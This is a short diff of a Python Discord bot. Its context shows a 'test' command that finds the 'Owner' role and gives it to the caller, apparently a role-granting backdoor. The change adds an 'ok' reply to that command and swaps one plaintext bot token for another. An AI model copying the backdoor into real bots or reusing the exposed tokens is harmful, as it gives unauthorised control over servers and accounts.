@@ -322,7 +322,7 @@ async def test(ctx):
             if( i.name=="Owner"):
                 x=i
         await ctx.author.add_roles(x)
-        
+        await ctx.send("ok")
 
 @client.command()
 async def rtfm(ctx):
@@ -403,4 +403,4 @@ So In conclusion
 
     
 
-client.run('NDA3MDY0OTIyMTU4MjY4NDE2.DsCqGw.LKuD46PSvvv4BIPMTdmS_Te1nfM')
+client.run('NDA3MDY0OTIyMTU4MjY4NDE2.DsCr1A.HUVogT0vjEk1k0_6tDEWxyhCX78')
